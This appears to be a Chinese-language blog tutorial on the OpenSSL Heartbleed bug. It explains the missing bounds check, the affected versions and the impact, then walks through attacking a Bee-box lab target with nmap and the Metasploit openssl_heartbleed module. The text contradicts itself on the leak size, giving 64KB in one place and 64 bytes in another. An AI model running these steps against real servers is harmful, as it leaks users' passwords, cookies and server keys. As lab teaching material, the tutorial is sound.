Heartbleed

Heartbleed漏洞，也叫心脏滴血漏洞。是流行的OpenSSL加密软件库中的一个严重漏洞。该漏洞允许用户窃取在正常情况下被用来保护互联网的SSL/TLS加密保护的信息。

Heartbleed漏洞允许互联网上的任何人读取受OpenSSL漏洞保护的系统的内存。这就损害了用于标识服务提供者和加密通信、用户名和密码以及实际内容的秘钥。这允许攻击者窃听通信，直接从服务和用户那里窃取数据，并模拟服务和用户。

Heartbleed漏洞存在的对象是OpenSSL，不同版本Heartbleed漏洞存在情况如下：


Heartbleed于2011年12月被引入到OpenSSL中，自OpenSSL于2012年3月14日发布1.0.1以来就一直存在。2014年4月7日发布的OpenSSL 1.0.1g修复了这个漏洞。





漏洞危害

Heartbleed漏洞是由于未能在memcpy()调用受害用户输入内容作为长度参数之前正确进行边界检查。攻击者可以追踪OpenSSL所分配的64KB缓存、将超出必要范围的字节信息复制到缓存当中再返回缓存内容，这样一来受害者的内存内容就会以每次64KB的速度进行泄露。我们可以通过该漏洞读取每次攻击泄露出来的信息，所以可能也可以获取到服务器的私钥，用户cookie和密码等。





漏洞复现

工具环境：Bee-box、kali linux、metasploit

1、确定目标ip，使用nmap脚本扫描，确定漏洞存在


2、启动kali自带的msf
msfconsole


3、找到heartbleed

heartbleed
使用第一个选项，并且查看一下都需要设置哪些参数。
use auxiliary/scanner/ssl/openssl_heartbleed

4、配置目标

设置目标IP

set RHOST ip
设置verbose参数为true，verbose为true才可以看到泄露的信息。
set verbose true


5、开始攻击

exploit

每次攻击都可以获取64字节的信息，多exploit几次，就可能会得到一些网站的重要信息，比如用户的登录用户名以及密码等。这样从每次得到的信息，总结一下，就可以得出用户的详细信息。
